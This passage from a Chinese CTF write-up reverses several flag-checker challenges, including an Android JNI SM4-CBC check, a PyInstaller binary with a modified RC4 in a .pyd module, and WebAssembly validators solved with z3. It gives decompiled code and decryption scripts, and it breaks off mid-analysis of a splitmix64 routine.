72 34 6E 64 30 6D 5F 73 74 61 74 65 73 5F 6E 65 65 64 5F 61 5F 6D 61 70

尝试按 ASCII 解码:
r4nd0m_states_need_a_map
```

```txt
flag{r4nd0m_states_need_a_map}
```

### 银河售后中心·三：银狼把客服名字改了

![](https://img.halfcity.top/2026/11/10/75fd7ef47ccf6e4ee72715d2d87f9902.png)

`MainActivity` 中依旧调用了 `TicketVerifier.check` 来检查 flag。

![](https://img.halfcity.top/2026/11/10/3ae04b24cb568a5d41bb8cb19a20d595.png)

```java
package org.galactic.aftercare.wolf;

import java.nio.charset.StandardCharsets;

public final class TicketVerifier {
    public static boolean check(String s) {
        if(s != null && s.length() == 30 && s.startsWith("flag{") && s.endsWith("}")) {
            String s1 = s.substring(5, 29);
            int v1 = 0;
            while(v1 < 24) {
                int v2 = s1.charAt(v1);
                if(v2 >= 33 && v2 <= 0x7E) {
                    ++v1;
                    continue;
                }

                return false;
            }

            byte[] arr_b = s1.getBytes(StandardCharsets.US_ASCII);
            byte[] arr_b1 = new byte[24];
            for(int v = 0; v < 24; ++v) {
                arr_b1[v] = arr_b[(v + 5) % 24];
            }

            return NativeDesk.verifyTicket(arr_b1);
        }

        return false;
    }
}
```

这里是一个简单的有效性检验和数组循环左移。

主要的校验逻辑还是在 native 层：

![](https://img.halfcity.top/2026/11/10/15e81fdfd4aee2b266bfed17e0eeaa4e.png)将 so 导出并放到 IDA 中分析一下：

![](https://img.halfcity.top/2026/11/10/4981f1eba6332db1c50df0f92e54cacb.png)

第一眼没看到校验函数，猜测是在 `JNI_OnLoad` 里面动态注册的。

![](https://img.halfcity.top/2026/11/10/9e5f7196d0ef5f599ca826d869de9262.png)

```c
jint JNI_OnLoad(JavaVM *vm, void *reserved)
{
  __int64 v3; // [xsp+10h] [xbp-30h]
  jint n65542; // [xsp+2Ch] [xbp-14h]
  _QWORD v5[2]; // [xsp+30h] [xbp-10h] BYREF

  v5[1] = *(_QWORD *)(_ReadStatusReg(TPIDR_EL0) + 40);
  if ( (*vm)->GetEnv(vm, (void **)v5, 65542) )
  {
    n65542 = -1;
  }
  else
  {
    v3 = (*(__int64 (__fastcall **)(_QWORD, const char *))(*(_QWORD *)v5[0] + 48LL))(
           v5[0],
           "org/galactic/aftercare/wolf/NativeDesk");
    if ( v3
      && !(*(unsigned int (__fastcall **)(_QWORD, __int64, char **, __int64))(*(_QWORD *)v5[0] + 1720LL))(
            v5[0],
            v3,
            off_34A0,                           // "verifyTicket"
            1) )
    {
      n65542 = 65542;
    }
    else
    {
      n65542 = -1;
    }
  }
  _ReadStatusReg(TPIDR_EL0);
  return n65542;
}
```

可以看到这里动态注册了一个函数，这里其实可以直接去看校验逻辑，但我还是简单修复一下吧。

这里应该先通过 vm 获取了 env 然后调用了注册函数：

![](https://img.halfcity.top/2026/11/10/b37dbad1cd712ac820adb033fe78e49d.png)

这样看起来舒服多了，我们接下来去看具体注册的 entry：

![](https://img.halfcity.top/2026/11/10/0a0451f5ad111017a44ba06bdd5396a3.png)

标准的 entry 有三个字段，分别是函数名、函数签名和函数 VA。

我们来到 `verifyTicket` 函数中，可以看到 env 没有被识别出来，我们需要稍微修复一下。

![](https://img.halfcity.top/2026/11/10/3d8c9fc6484d480d21f641c36970a013.png)简单修复如下：

![](https://img.halfcity.top/2026/11/10/7249a22ef8cce7137812ecc2bbd9fb7d.png)

这里的 IDA 总是会错误识别 `GetByteArrayRegion` 这个函数的参数。

![](https://img.halfcity.top/2026/11/10/023c44d189ac124d1276afe9485eb2da.png)

这里应该是先复制 ticket 到 buf ，然后构造加密块。

加密的逻辑应该在 `sub_DB8` 中：

![](https://img.halfcity.top/2026/11/10/279c36b1dd6118c6ce517d1dbad06195.png)

AI 识别一下算法：

![](https://img.halfcity.top/2026/11/10/4f0843d9979fa54c88d7f2237cac5287.png)

原来是 SM4，回到前面：

```c
__memcpy_chk(v11, &unk_5F2, 16, 16);   // 初始向量 IV = unk_5F2
for ( k = 0; k <= 1; ++k )             // 处理两个 16 字节块
{
    for ( m = 0; m <= 15; ++m )
        buf[16 * k + m] = buf[16 * k + 32 + m] ^ v11[m];   // 异或 IV
    sm4_encrypt(&buf[16 * k], &buf[16 * k], &unk_602);     // SM4 加密，密钥 = unk_602
    __memcpy_chk(v11, &buf[16 * k], 16, 16);               // 加密结果作为下一块的 IV
}
```

- **初始向量 IV**：16 字节常量 `unk_5F2`。
- **密钥**：SM4 密钥 `unk_602`。
- 加密流程为 **CBC 模式**：
  - 第 1 块：`buf[32..47]` 与 IV 异或 → SM4 加密 → 结果存入 `buf[0..15]`，并作为第 2 块的 IV。
  - 第 2 块：`buf[48..63]` 与上一块密文异或 → SM4 加密 → 结果存入 `buf[16..31]`。
- 最终 `buf[0..31]` 为加密后的 32 字节密文。

解密脚本如下：

```py
from gmssl.sm4 import CryptSM4, SM4_DECRYPT

# s2_ ，32 字节 SM4-CBC 密文
cipher = bytes([
    0xCB, 0xC1, 0x00, 0x92, 0x2B, 0x6F, 0x1F, 0xD7,
    0xED, 0x48, 0x7D, 0x44, 0x57, 0x4F, 0x1B, 0x35,
    0xFF, 0x27, 0x24, 0x06, 0x12, 0x50, 0x9A, 0xBC,
    0x10, 0x19, 0x20, 0x5F, 0x61, 0x66, 0x84, 0x7A,
])

# unk_5F2，16 字节 IV
iv = bytes([
    0x27, 0xA1, 0x0E, 0x8C, 0x54, 0x93, 0xF6, 0xB0,
    0xD1, 0x2E, 0x7A, 0x48, 0x65, 0xC0, 0x39, 0xBF,
])

# unk_602，16 字节 SM4 Key
key = bytes([
    0x51, 0x82, 0xD4, 0xA6, 0xC8, 0x39, 0xE0, 0x7B,
    0x12, 0x65, 0xF3, 0xA9, 0xBC, 0x40, 0xDE, 0x78,
])

sm4 = CryptSM4()
sm4.set_key(key, SM4_DECRYPT)
arr_b1 = sm4.crypt_cbc(iv, cipher)

# 逆向 Java 的循环左移 5 位
arr_b = arr_b1[-5:] + arr_b1[:-5]

s1 = arr_b.decode('ascii')
print('flag{' + s1 + '}')
```

```txt
> python center.py
flag{s1lverw0lf_regs_natives!}
```

```txt
flag{s1lverw0lf_regs_natives!}
```

## Week 4

---

## Reverse

### 只是一只中蛇

![](https://img.halfcity.top/2026/11/10/8e3d2c45d2b85b14e2bdbb3db6156450.png)

查壳发现是 pyinstaller 打包，我们直接解包：

```txt
> pyinstxtractor-ng nativecurrent.exe
[+] Processing nativecurrent.exe
[+] Pyinstaller version: 2.1+
[+] Python version: 3.13
[+] Length of package: 7597488 bytes
[+] Found 65 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot01_bootstrap.pyc
[+] Possible entry point: pyi_rth_inspect.pyc
[+] Possible entry point: main.pyc
[+] Found 112 files in PYZ archive
[+] Successfully extracted pyinstaller archive: nativecurrent.exe

You can now use a python decompiler on the pyc files within the extracted directory
```

![](https://img.halfcity.top/2026/11/10/ce0eb548e1e6e3c0567e9108251d5039.png)

```py
# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: 'main.py'
# Bytecode version: 3.13.0rc3 (3571)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

from stream_core import verify
try:
    entered = input('Input flag: ')
except (EOFError, KeyboardInterrupt):
    entered = ''
print('Correct' if verify(entered) else 'Wrong')
```

发现这里导入了一个外部库，`stream_core.pyd` 这是一个 pyd 文件，我们直接使用 IDA 分析。

![](https://img.halfcity.top/2026/11/10/d2c1531cabe886a9ee78609fe58f021b.png)

这里注册了一个模块，我们去找找定义：

![](https://img.halfcity.top/2026/11/10/130ff71ba26e8fd983d1cdacc856ceb0.png)

![](https://img.halfcity.top/2026/11/10/e97689c6540b904a0115822838c41e3c.png)

这里的 `sub_180001000` 应该就是注册的方法了。

![](https://img.halfcity.top/2026/11/10/312c5ea407384ed48d971df1c4b074c9.png)

```c
__int64 __fastcall verify(char *a1, _BYTE *a2)
{
  void *v2; // rax
  int *v3; // rbx
  bool v5; // zf
  __m128i si128; // xmm2
  unsigned __int8 v7; // r11
  __m128 v8; // xmm3
  char *n0x100; // rcx
  __m128i v10; // xmm0
  __m128i v11; // xmm0
  __m128i v12; // xmm1
  __m128i v13; // xmm1
  __m128i v14; // xmm0
  __m128i v15; // xmm0
  __int64 v16; // rax
  __m128i v17; // xmm1
  __m128i v18; // xmm1
  unsigned int n0x100_1; // r10d
  char *v20; // r8
  char v21; // r9
  char v22; // al
  char *v23; // rcx
  __int64 v24; // r14
  __int64 v25; // rdi
  char v26; // si
  int v27; // ebp
  __int64 n0x22; // r11
  unsigned __int8 v29; // al
  _BYTE *v30; // rdx
  char v31; // r8
  char v32; // r9
  unsigned __int8 v33; // r10
  int v34; // r8d
  _BYTE *v35; // rcx
  char *v36; // rcx
  __int64 v37; // [rsp+28h] [rbp-140h] BYREF
  __int64 n34; // [rsp+30h] [rbp-138h] BYREF
  _QWORD v39[33]; // [rsp+38h] [rbp-130h] BYREF

  if ( !(unsigned int)PyArg_ParseTuple(a2, &unk_1800021EC, &v37) )
    return 0;
  v2 = PyUnicode_AsASCIIString(v37);
  v3 = (int *)v2;
  if ( !v2 )
  {
    PyErr_Clear();
    return Py_FalseStruct;
  }
  if ( (unsigned int)PyBytes_AsStringAndSize(v2, v39, &n34) )
  {
    if ( *v3 >= 0 )
    {
      v5 = (*(_QWORD *)v3)-- == 1;
      if ( v5 )
        Py_Dealloc(v3);
    }
    return 0;
  }
  if ( n34 == 34 )
  {
    si128 = _mm_load_si128((const __m128i *)&xmmword_1800021F0);
    v7 = 0;
    v8 = (__m128)_mm_load_si128((const __m128i *)&xmmword_180002200);
    n0x100 = 0;
    do
    {
      v10 = (__m128i)_mm_and_ps((__m128)_mm_add_epi32(_mm_shuffle_epi32(_mm_cvtsi32_si128(n0x100), 0), si128), v8);
      v11 = _mm_packus_epi16(v10, v10);
      v12 = (__m128i)_mm_and_ps(
                       (__m128)_mm_add_epi32(_mm_shuffle_epi32(_mm_cvtsi32_si128((int)n0x100 + 4), 0), si128),
                       v8);
      *(_DWORD *)((char *)&v39[1] + n0x100) = _mm_cvtsi128_si32(_mm_packus_epi16(v11, v11));
      v13 = _mm_packus_epi16(v12, v12);
      *(_DWORD *)((char *)&v39[1] + (unsigned int)(n0x100 + 4)) = _mm_cvtsi128_si32(_mm_packus_epi16(v13, v13));
      v14 = (__m128i)_mm_and_ps(
                       (__m128)_mm_add_epi32(_mm_shuffle_epi32(_mm_cvtsi32_si128((int)n0x100 + 8), 0), si128),
                       v8);
      v15 = _mm_packus_epi16(v14, v14);
      *(_DWORD *)((char *)&v39[1] + (unsigned int)(n0x100 + 8)) = _mm_cvtsi128_si32(_mm_packus_epi16(v15, v15));
      v16 = (unsigned int)(n0x100 + 12);
      n0x100 = (unsigned int)(n0x100 + 16);
      v17 = (__m128i)_mm_and_ps((__m128)_mm_add_epi32(_mm_shuffle_epi32(_mm_cvtsi32_si128(v16), 0), si128), v8);
      v18 = _mm_packus_epi16(v17, v17);
      *(_DWORD *)((char *)&v39[1] + v16) = _mm_cvtsi128_si32(_mm_packus_epi16(v18, v18));
    }
    while ( (unsigned int)n0x100 < 0x100 );
    n0x100_1 = 0;
    do
    {
      v20 = (char *)&v39[1] + n0x100_1;
      v21 = *v20;
      v22 = n0x100_1 + byte_180002160[n0x100_1 % 0xDuLL] + *v20;
      ++n0x100_1;
      v7 += v22;
      v23 = (char *)&v39[1] + v7;
      *v20 = *v23;
      *v23 = v21;
    }
    while ( n0x100_1 < 0x100 );
    v24 = v39[0];
    LOBYTE(v25) = 0;
    v26 = 0;
    v27 = 0;
    n0x22 = 0;
    do
    {
      v29 = v25 + 1;
      v30 = (char *)&v39[1] + (unsigned __int8)(v25 + 1);
      v25 = (unsigned __int8)(v25 + 2);
      v31 = *((_BYTE *)&v39[1] + v29);
      v32 = v26 + v31;
      *v30 = *((_BYTE *)&v39[1] + (unsigned __int8)(v26 + v31));
      *((_BYTE *)&v39[1] + (unsigned __int8)(v26 + v31)) = v31;
      v33 = 7 * n0x22 + 68;
      v34 = (unsigned __int8)((7 * n0x22 + 61)
                            ^ byte_180002160[n0x22 + 16]
                            ^ *(_BYTE *)(n0x22 + v24)
                            ^ *((_BYTE *)&v39[1] + (unsigned __int8)(*v30 + v31)));
      LOBYTE(v30) = *((_BYTE *)&v39[1] + v25);
      v26 = v32 + (_BYTE)v30;
      v35 = (char *)&v39[1] + (unsigned __int8)(v32 + (_BYTE)v30);
      *((_BYTE *)&v39[1] + v25) = *v35;
      *v35 = (_BYTE)v30;
      v36 = (unsigned int)(n0x22 + 1);
      n0x22 = (unsigned int)(n0x22 + 2);
      v27 |= v34
           | v33
           ^ (unsigned __int8)byte_180002160[v36 + 16]
           ^ *(unsigned __int8 *)(v36 + v24)
           ^ *((unsigned __int8 *)&v39[1] + (unsigned __int8)(*((_BYTE *)&v39[1] + v25) + (_BYTE)v30));
    }
    while ( (unsigned int)n0x22 < 0x22 );
    if ( *v3 >= 0 )
    {
      v5 = (*(_QWORD *)v3)-- == 1;
      if ( v5 )
        Py_Dealloc(v3);
    }
    if ( v27 )
      return Py_FalseStruct;
    return Py_TrueStruct;
  }
  else
  {
    if ( *v3 < 0 )
      return Py_FalseStruct;
    v5 = (*(_QWORD *)v3)-- == 1;
    if ( !v5 )
      return Py_FalseStruct;
    Py_Dealloc(v3);
    return Py_FalseStruct;
  }
}
```

第一个参数是 self，第二个参数应该就是 arg 了。

我们一边分析一边还原名字。

首先先解析参数，然后转 ascii `PyArg_ParseTuple(args, &unk_1800021EC, &arg_tuple)` `arg_str = PyUnicode_AsASCIIString(arg_tuple)`。

随后转字节 `PyBytes_AsStringAndSize(arg_str, arg_bytes, &str_len)` 。

这里数组 `_QWORD arg_bytes[33]` 都是 QWORD，一共有 256 + 8 字节的空间，所以应该是一个 buf。

```c
do
    {
      v10 = (__m128i)_mm_and_ps((__m128)_mm_add_epi32(_mm_shuffle_epi32(_mm_cvtsi32_si128(n0x100), 0), si128), v8);
      v11 = _mm_packus_epi16(v10, v10);
      v12 = (__m128i)_mm_and_ps(
                       (__m128)_mm_add_epi32(_mm_shuffle_epi32(_mm_cvtsi32_si128((int)n0x100 + 4), 0), si128),
                       v8);
      *(_DWORD *)((char *)&arg_bytes[1] + n0x100) = _mm_cvtsi128_si32(_mm_packus_epi16(v11, v11));
      v13 = _mm_packus_epi16(v12, v12);
      *(_DWORD *)((char *)&arg_bytes[1] + (unsigned int)(n0x100 + 4)) = _mm_cvtsi128_si32(_mm_packus_epi16(v13, v13));
      v14 = (__m128i)_mm_and_ps(
                       (__m128)_mm_add_epi32(_mm_shuffle_epi32(_mm_cvtsi32_si128((int)n0x100 + 8), 0), si128),
                       v8);
      v15 = _mm_packus_epi16(v14, v14);
      *(_DWORD *)((char *)&arg_bytes[1] + (unsigned int)(n0x100 + 8)) = _mm_cvtsi128_si32(_mm_packus_epi16(v15, v15));
      v16 = (unsigned int)(n0x100 + 12);
      n0x100 = (unsigned int)(n0x100 + 16);
      v17 = (__m128i)_mm_and_ps((__m128)_mm_add_epi32(_mm_shuffle_epi32(_mm_cvtsi32_si128(v16), 0), si128), v8);
      v18 = _mm_packus_epi16(v17, v17);
      *(_DWORD *)((char *)&arg_bytes[1] + v16) = _mm_cvtsi128_si32(_mm_packus_epi16(v18, v18));
    }
while ( (unsigned int)n0x100 < 0x100 );
```

这里先初始化 SBOX `arg_bytes`。

随后便是 KSA，这里有很明显的 RC4 的特征 `n0x100_1 + byte_180002160[n0x100_1 % 0xDuLL] + *v20`：

```c
    n0x100_1 = 0;
    do
    {
      v20 = (char *)&arg_bytes[1] + n0x100_1;
      v21 = *v20;
      v22 = n0x100_1 + byte_180002160[n0x100_1 % 0xDuLL] + *v20;
      ++n0x100_1;
      v7 += v22;
      v23 = (char *)&arg_bytes[1] + v7;
      *v20 = *v23;
      *v23 = v21;
    }
    while ( n0x100_1 < 0x100 );
```

其中 `byte_180002160` 的 0x00 ~ 0x0C 这13个字节就是用来打乱 SBOX 的密钥了。

观察计算 j 的部分发现被魔改了现在的逻辑应该是： `j = (j + i + key[i % key_len] + S[i]) & 0xFF`。

这里加上了一个 i。

随后就是魔改的 PRGA 产生密钥流并计算密文。这里每轮处理了两个字节。最后与 `byte_180002160` 的 0x10 ~ 0x31 这34个字节比较。

```c
input[k]   = (7*k + 61) ^ byte_180002160[k + 16]  ^ S[idx1]
input[k+1] = (7*k + 68) ^ byte_180002160[k + 17]  ^ S[idx2]
```

解密脚本如下：

```py
data = bytes([
    0xD8, 0x3A, 0x14, 0x75, 0xC2, 0x6B, 0xF1, 0x49, 0x9E, 0x05, 0xAC, 0x37, 0x24,
    0x00, 0x00, 0x00,
    0xE8, 0xE2, 0x3B, 0xD5, 0x6B, 0x4A, 0x51, 0x53, 0x55, 0x03, 0xEB, 0x24,
    0x70, 0x1D, 0x08, 0x8A, 0xB3, 0x72, 0xF7, 0x77, 0x68, 0x7E, 0xB0, 0xC0,
    0x05, 0x75, 0xF4, 0xA8, 0xA5, 0xAE, 0xD3, 0xAD, 0xF7, 0xBA,
    0x00, 0x00
])

key = data[0:13]
ct  = data[16:50]

# xmmword_1800021F0 = {0,1,2,3}
S = bytearray(range(256))

j = 0
for i in range(256):
    j = (j + i + key[i % 13] + S[i]) & 0xFF
    S[i], S[j] = S[j], S[i]

i = 0
j = 0

flag = bytearray(34)

for k in range(0, 34, 2):
    i = (i + 1) & 0xFF
    si = S[i]
    j = (j + si) & 0xFF
    S[i], S[j] = S[j], S[i]
    idx = (S[i] + S[j]) & 0xFF

    flag[k] = ((7 * k + 61) ^ ct[k] ^ S[idx]) & 0xFF

    i = (i + 1) & 0xFF
    si = S[i]
    j = (j + si) & 0xFF
    S[i], S[j] = S[j], S[i]
    idx = (S[i] + S[j]) & 0xFF

    flag[k + 1] = ((7 * k + 68) ^ ct[k + 1] ^ S[idx]) & 0xFF

print(flag)
print(flag.decode('ascii'))
```

输出如下：

```txt
> python native_decrypt.py
bytearray(b'flag{pyd_n4t1v3_rc4_n33d5_4_tw15t}')
flag{pyd_n4t1v3_rc4_n33d5_4_tw15t}
```

```txt
flag{pyd_n4t1v3_rc4_n33d5_4_tw15t}
```

### 银河售后中心·四：小程序回执

题目没给 AppID，猜测没有加密：

![](https://img.halfcity.top/2026/11/10/d81b667fa1efdb7c5194c8bfe01a6905.png)

![](https://img.halfcity.top/2026/11/10/58c7af749c8e03dfacfd49e23606128b.png)

![](https://img.halfcity.top/2026/11/10/2b7c93d815ea42d56af0873fd2c442f1.png)

发现这里有 wasm 模块，使用 wasm2c 来反编译。

关键逻辑如下：

```c
void wasm2c_check_free(w2c_check* instance) {
  wasm_rt_free_funcref_table(&instance->w2c_0x5F_indirect_function_table);
  wasm_rt_free_memory(&instance->w2c_memory);
}

wasm_rt_func_type_t wasm2c_check_get_func_type(uint32_t param_count, uint32_t result_count, ...) {
  va_list args;
  
  if (param_count == 0 && result_count == 0) {
    va_start(args, result_count);
    if (true) {
      va_end(args);
      return w2c_check_t0;
    }
    va_end(args);
  }
  
  if (param_count == 0 && result_count == 1) {
    va_start(args, result_count);
    if (true && va_arg(args, int) == WASM_RT_I32) {
      va_end(args);
      return w2c_check_t1;
    }
    va_end(args);
  }
  
  if (param_count == 3 && result_count == 1) {
    va_start(args, result_count);
    if (true && va_arg(args, int) == WASM_RT_I32 && va_arg(args, int) == WASM_RT_I32 && va_arg(args, int) == WASM_RT_I32 && va_arg(args, int) == WASM_RT_I32) {
      va_end(args);
      return w2c_check_t2;
    }
    va_end(args);
  }
  
  return NULL;
}

void w2c_check_0x5F_wasm_call_ctors_0(w2c_check* instance) {
  FUNC_PROLOGUE;
  FUNC_EPILOGUE;
}

u32 w2c_check_input_ptr_0(w2c_check* instance) {
  FUNC_PROLOGUE;
  u32 var_i0;
  var_i0 = 1056u;
  FUNC_EPILOGUE;
  return var_i0;
}

u32 w2c_check_check_0(w2c_check* instance, u32 var_p0, u32 var_p1, u32 var_p2) {
  u32 var_l3 = 0, var_l4 = 0;
  FUNC_PROLOGUE;
  u32 var_i0, var_i1, var_i2, var_i3, var_i4, var_i5;
  var_i0 = 0u;
  var_l3 = var_i0;
  var_i0 = var_p0;
  var_i1 = 1056u;
  var_i0 = var_i0 != var_i1;
  if (var_i0) {goto var_B0;}
  var_i0 = var_p1;
  var_i1 = 24u;
  var_i0 = var_i0 != var_i1;
  if (var_i0) {goto var_B0;}
  var_i0 = 0u;
  var_l3 = var_i0;
  var_i0 = 0u;
  var_p0 = var_i0;
  var_L1: 
    var_i0 = var_p0;
    var_i1 = 5u;
    var_i0 = DIV_U(var_i0, var_i1);
    var_p1 = var_i0;
    var_i0 = var_p0;
    var_i1 = 1056u;
    var_i0 += var_i1;
    var_i0 = i32_load8_u_default32(&instance->w2c_memory, (u64)(var_i0));
    var_l4 = var_i0;
    var_i1 = 4294967169u;
    var_i0 += var_i1;
    var_i1 = 255u;
    var_i0 &= var_i1;
    var_i1 = 162u;
    var_i0 = var_i0 < var_i1;
    if (var_i0) {goto var_B0;}
    var_i0 = var_p0;
    var_i1 = 4294967284u;
    var_i0 += var_i1;
    var_i1 = 3u;
    var_i0 = var_i0 < var_i1;
    if (var_i0) {goto var_B2;}
    var_i0 = var_p0;
    var_i1 = 1024u;
    var_i0 += var_i1;
    var_i0 = i32_load8_u_default32(&instance->w2c_memory, (u64)(var_i0));
    var_i1 = var_p0;
    var_i2 = 11u;
    var_i1 *= var_i2;
    var_i2 = var_l4;
    var_i3 = var_p0;
    var_i4 = 29u;
    var_i3 *= var_i4;
    var_i4 = 109u;
    var_i3 += var_i4;
    var_i2 ^= var_i3;
    var_l4 = var_i2;
    var_i3 = var_p0;
    var_i4 = var_p1;
    var_i5 = 4294967291u;
    var_i4 *= var_i5;
    var_i3 += var_i4;
    var_p1 = var_i3;
    var_i4 = 1u;
    var_i3 += var_i4;
    var_i4 = 7u;
    var_i3 &= var_i4;
    var_i2 <<= (var_i3 & 31);
    var_i3 = var_l4;
    var_i4 = 255u;
    var_i3 &= var_i4;
    var_i4 = var_p1;
    var_i5 = 4294967295u;
    var_i4 ^= var_i5;
    var_i5 = 7u;
    var_i4 &= var_i5;
    var_i3 >>= (var_i4 & 31);
    var_i2 |= var_i3;
    var_i1 += var_i2;
    var_i2 = 55u;
    var_i1 += var_i2;
    var_i2 = 255u;
    var_i1 &= var_i2;
    var_i0 = var_i0 != var_i1;
    if (var_i0) {goto var_B0;}
    var_B2:;
    var_i0 = var_p0;
    var_i1 = 1u;
    var_i0 += var_i1;
    var_p0 = var_i0;
    var_i1 = 24u;
    var_i0 = var_i0 != var_i1;
    if (var_i0) {goto var_L1;}
  var_i0 = 0u;
  var_l3 = var_i0;
  var_i0 = 16u;
  var_p0 = var_i0;
  var_i0 = 0u;
  var_i0 = i32_load8_u_default32(&instance->w2c_memory, (u64)(var_i0) + 1069u);
  var_i1 = 8u;
  var_i0 <<= (var_i1 & 31);
  var_i1 = 0u;
  var_i1 = i32_load8_u_default32(&instance->w2c_memory, (u64)(var_i1) + 1068u);
  var_i2 = 16u;
  var_i1 <<= (var_i2 & 31);
  var_i0 |= var_i1;
  var_i1 = 0u;
  var_i1 = i32_load8_u_default32(&instance->w2c_memory, (u64)(var_i1) + 1070u);
  var_i0 |= var_i1;
  var_i1 = var_p2;
  var_i0 = var_i0 != var_i1;
  if (var_i0) {goto var_B0;}
  var_i0 = 2166136261u;
  var_p1 = var_i0;
  var_L3: 
    var_i0 = var_p2;
    var_i1 = var_p0;
    var_i0 >>= (var_i1 & 31);
    var_i1 = 255u;
    var_i0 &= var_i1;
    var_i1 = var_p1;
    var_i0 ^= var_i1;
    var_i1 = 16777619u;
    var_i0 *= var_i1;
    var_p1 = var_i0;
    var_i0 = var_p0;
    var_i1 = 4294967288u;
    var_i0 += var_i1;
    var_p0 = var_i0;
    var_i1 = 4294967288u;
    var_i0 = var_i0 != var_i1;
    if (var_i0) {goto var_L3;}
  var_i0 = var_p1;
  var_i1 = 3901582136u;
  var_i0 = var_i0 == var_i1;
  var_l3 = var_i0;
  var_B0:;
  var_i0 = var_l3;
  FUNC_EPILOGUE;
  return var_i0;
}
```

这里是密文：

```c
static const u8 data_segment_data_w2c_check_d0[] = {
  0x6b, 0x0d, 0x83, 0xa3, 0xb4, 0xa1, 0x8a, 0xfe, 0xd2, 0xba, 0x6a, 0x7f, 
  0x00, 0x00, 0x00, 0x84, 0x70, 0x3d, 0x4e, 0xc5, 0x9e, 0xcc, 0xed, 0xc6, 
};
```

导出函数 `u32 w2c_check_check(w2c_check* instance, u32 p0, u32 p1, u32 p2)` 这里就是主逻辑了。

`var_i1 = 1056u`  `var_i1 = 24u` 这里限定了缓冲区的长度和 flag 的长度。

随后会建立一系列的约束。

首先是可打印字符范围检查：

```c
var_i0 = var_l4;
var_i1 = 4294967169u;   // -127
var_i0 += var_i1;
var_i1 = 255u;
var_i0 &= var_i1;
var_i1 = 162u;
var_i0 = var_i0 < var_i1;
if (var_i0) goto var_B0;  // 失败
```

等价于：

```
33 <= b <= 126
```

也就是可打印 ASCII 范围。

后面跳过了第 12、13、14 字节

```c
var_i0 = var_p0;
var_i1 = 4294967284u;  // -12
var_i0 += var_i1;
var_i1 = 3u;
var_i0 = var_i0 < var_i1;
if (var_i0) {goto var_B2;}
```

因为 `var_p0` 是无符号 32 位，所以 `(i - 12) < 3`

```
i = 12, 13, 14
```

随后对其他未跳过的字节做如下变换：

```c
var_i0 = data[i];                 // memory[1024+i]
var_i1 = i * 11;

var_i2 = l4;                      // input[i]
var_i3 = i * 29 + 109;
var_i2 ^= var_i3;
l4 = var_i2;                      // x = input[i] ^ (i*29+109)

// p1 = i / 5
var_p1 = i / 5;

// i % 5 = i - 5*(i/5)
var_i3 = i;
var_i4 = p1;
var_i5 = -5;
var_i4 *= var_i5;
var_i3 += var_i4;
p1 = var_i3;                      // p1 = i % 5

// 左移量 = (i%5 + 1) & 7
var_i3 += 1;
var_i3 &= 7;

var_i2 <<= var_i3;

// 右移量 = (~(i%5)) & 7 = 7 - i%5
var_i3 = l4 & 255;
var_i4 = p1;
var_i4 ^= -1;
var_i4 &= 7;

var_i3 >>= var_i4;

var_i2 |= var_i3;
var_i1 += var_i2;
var_i1 += 55;
var_i1 &= 255;

if (data[i] != var_i1) fail;
```

即对：

```c
b = input[i]
x = b ^ ((i*29 + 109) & 0xff)
s1 = (i % 5) + 1
s2 = 7 - (i % 5)
term = (x << s1) | (x >> s2)
```

需满足：

```c
data[i] == ((i*11 + term + 55) & 0xff)
```

最后第 12、13、14 字节拼成 `p2`，并进行 FNV-1a 校验。

```c
p1 = 2166136261u;   // FNV offset basis
p0 = 16;

do {
    byte = (p2 >> p0) & 255;
    p1 ^= byte;
    p1 *= 16777619u;   // FNV prime
    p0 += -8;
} while (p0 != -8);
```

解密脚本如下：

```py
from z3 import *

data = [
    0x6b, 0x0d, 0x83, 0xa3, 0xb4, 0xa1, 0x8a, 0xfe,
    0xd2, 0xba, 0x6a, 0x7f, 0x00, 0x00, 0x00, 0x84,
    0x70, 0x3d, 0x4e, 0xc5, 0x9e, 0xcc, 0xed, 0xc6
]

bs = [BitVec(f'b{i}', 8) for i in range(24)]
sol = Solver()

# check 中的范围检查：每个字符必须在可打印 ASCII 范围内
# (b - 127) & 0xff >= 162  <=>  33 <= b <= 126
for b in bs:
    sol.add(b >= 33, b <= 126)

# 除 12、13、14 外，逐字节满足变换关系
for i in range(24):
    if i in (12, 13, 14):
        continue

    # x = input[i] ^ (i*29 + 109)
    c = (i * 29 + 109) & 0xff
    x = bs[i] ^ BitVecVal(c, 8)

    # p1 = i / 5
    # shift_left  = (i - 5*(i/5) + 1) & 7 = (i%5 + 1) & 7
    # shift_right = (~(i - 5*(i/5))) & 7 = 7 - (i%5)
    s1 = (i % 5 + 1) & 7
    s2 = 7 - (i % 5)

    term = (x << s1) | LShR(x, s2)

    # data[i] == (i*11 + term + 55) & 0xff
    expected = BitVecVal((i * 11 + 55) & 0xff, 8) + term
    sol.add(BitVecVal(data[i], 8) == expected)

# 第 12、13、14 字节拼成 p2：
# p2 = (b12 << 16) | (b13 << 8) | b14
p2 = Concat(bs[12], bs[13], bs[14])

# FNV-1a 校验：
# h = 2166136261
# for byte in [p2>>16, p2>>8, p2]:
#     h = (h ^ byte) * 16777619
h = BitVecVal(2166136261, 32)

for hi, lo in [(23, 16), (15, 8), (7, 0)]:
    byte = Extract(hi, lo, p2)
    h = (h ^ ZeroExt(24, byte)) * BitVecVal(16777619, 32)

sol.add(h == BitVecVal(3901582136, 32))

if sol.check() == sat:
    m = sol.model()
    body = ''.join(chr(m.eval(b).as_long()) for b in bs)
    print("flag{" + body + "}")
```

输出如下：

```txt
> python crack.py
flag{wxapkg_wasm_hunt_3bytes!}
```

```txt
flag{wxapkg_wasm_hunt_3bytes!}
```

### 第十一刻

![](https://img.halfcity.top/2026/11/10/0da90df3126dbace62baa333f3260697.png)

![](https://img.halfcity.top/2026/11/10/84bbb3209aaaf90e35c3a72e3d7a0472.png)

抓包发现加载了 wasm 模块。反编译一下：

```txt
❯ wasm2c vault.wasm --output vault.c
```

wasm2c 生成的代码里，真正对外暴露的只有两个函数：

- w2c_vault_input_ptr → 固定返回 8192
- w2c_vault_check → 真正的校验函数

check 的开头：

```c
if (len != mem[4096]) return 0;          // 必须等于 42
if (ptr < 8192 || ptr >= 9088) return 0; // 指针范围检查
```

随后读取：

```c
rounds = mem[4100];   // = 11
seed   = mem[4104];   // 64-bit 种子
```

并把输入拷贝到 12288 起始的缓冲区，目标密文存放在 65536。

这一步确定了输入长度固定 42，处理后变成 11 个 u32，最终要和硬编码的 11 个 u32 完全相等。

w2c_vault_f76 是标准的 **splitmix64**：

```c
state += 0x9e3779b97f4a7c15;
